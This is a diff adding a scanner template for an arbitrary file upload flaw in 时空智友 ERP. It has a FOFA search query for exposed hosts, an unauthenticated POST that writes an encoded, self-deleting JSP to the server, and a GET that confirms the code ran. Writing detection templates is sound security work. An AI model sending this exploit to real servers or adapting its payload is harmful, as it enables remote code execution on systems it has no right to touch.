@@ -1,0 +1,42 @@
+id: shikongzhiyou-erp-uploadstudiofile-fileupload
+
+info:
+  name: 时空智友ERP系统 uploadStudioFile 任意文件上传漏洞
+  author: avic123
+  severity: critical
+  verified: true
+  description: |
+    时空智友ERP系统updater.uploadStudioFile存在任意文件上传漏洞，攻击者可利用该漏洞上传恶意软件，获取对服务器的远程访问权限或者破坏系统。
+    FOFA：body="login.jsp?login=null"
+  reference:
+    - https://mrxn.net/jswz/skzy-formservice-updater-uploadStudioFile.html
+  tags: shikongzhiyou,erp,fileupload
+  created: 2025/08/25
+
+set:
+  hostname: request.url.host
+  randstr: randomLowercase(8)
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /formservice?service=updater.uploadStudioFile
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: |
+        content=<?xml%20version="1.0"?><root><filename>{{randstr}}.jsp</filename><filepath>./</filepath><filesize>172</filesize><lmtime>1970-01-01%2008:00:00</lmtime></root><!--%3c%25%20%6f%75%74%2e%70%72%69%6e%74%28%22%3c%70%72%65%3e%22%29%3b%6f%75%74%2e%70%72%69%6e%74%6c%6e%28%31%31%31%20%2a%20%31%31%31%29%3b%6f%75%74%2e%70%72%69%6e%74%28%22%3c%2f%70%72%65%3e%22%29%3b%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%46%69%6c%65%28%61%70%70%6c%69%63%61%74%69%6f%6e%2e%67%65%74%52%65%61%6c%50%61%74%68%28%72%65%71%75%65%73%74%2e%67%65%74%53%65%72%76%6c%65%74%50%61%74%68%28%29%29%29%2e%64%65%6c%65%74%65%28%29%3b%0d%0a%25%3e%0d%0a-->
+    expression: >-
+      response.status == 200 && 
+      response.body.bcontains(bytes(randstr + ".jsp"))
+
+  r1:
+    request:
+      method: GET
+      path: /update/temp/studio/{{randstr}}.jsp
+    expression: >-
+      response.status == 200 && 
+      response.body.bcontains(bytes(randstr + ".jsp"))&&
+      response.body.bcontains(b'12321')
+
+expression: r0() && r1()
